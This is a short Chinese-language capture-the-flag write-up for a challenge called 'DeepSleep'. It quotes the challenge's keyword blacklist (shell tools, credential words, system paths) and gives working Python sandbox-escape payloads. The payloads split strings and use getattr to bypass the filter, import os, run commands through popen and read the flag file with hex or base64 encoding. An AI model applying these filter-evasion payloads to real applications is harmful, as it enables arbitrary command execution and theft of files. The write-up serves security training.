## DeepSleep
这一关直接抓包，
有黑名单
```
|   |
|---|
|[|
|'flag', 'cat', 'import', 'eval', 'exec', 'system', 'os.', 'subprocess',|
|'open', 'read', 'write', 'rm', 'delete', 'shutdown', 'reboot', 'python',|
|'php', 'bash', 'shell', 'command', 'curl', 'wget', 'ftp', 'telnet',|
|'ssh', 'scp', 'chmod', 'chown', 'sudo', 'su', 'admin', 'root', 'password',|
|'token', 'key', 'secret', 'config', 'env', 'environment', 'proc', 'sys',|
|'dev', 'etc', 'var', 'tmp', 'home', 'bin', 'sbin', 'usr', 'lib', 'etc','os','ls'|
|];|
```
但他好像不仅过滤了关键字，`.`也过滤了，但是getattr没有过滤。
```
getattr(obj, "name")  ==  obj.name
```
输入一些字符，一直报错是服务器繁忙。可能是没有回显，可以用`str()`让他回显
payload
```
str(getattr(getattr(__builtins__, '__im'+'port__')('o'+'s'), 'lis'+'tdir')('.'))
```
相当于
```
__builtins__.__import__('os').listdir('.')
```
可以列出当前目录。
因为对输出有过滤，所以
```
getattr(getattr(file('fl'+'ag'), 're'+'ad')(), 'en'+'code')('hex')
```
得到flag
也可以
```
str(getattr(getattr(getattr(__builtins__,'__imp'+'ort__')('o'+'s'),'po'+'pen')('l'+'s'),'re'+'ad')())
```
来执行指令，但是不知道为什么只回显一条，每次。
但是这不可以得到flag，应该是输出过滤了。
```
str(getattr(getattr(getattr(getattr(__builtins__,'__imp'+'ort__')('o'+'s'),'po'+'pen')('ca'+'t f'+'lag'),'re'+'ad')(),'enc'+'ode')('base64'))
```
相当于
```
__builtins__.__import__('os').popen('cat flag').read().encode('base64')
```
就可以得到flag。
之所以不用`cat flag|base64`是因为`|`被过滤了。
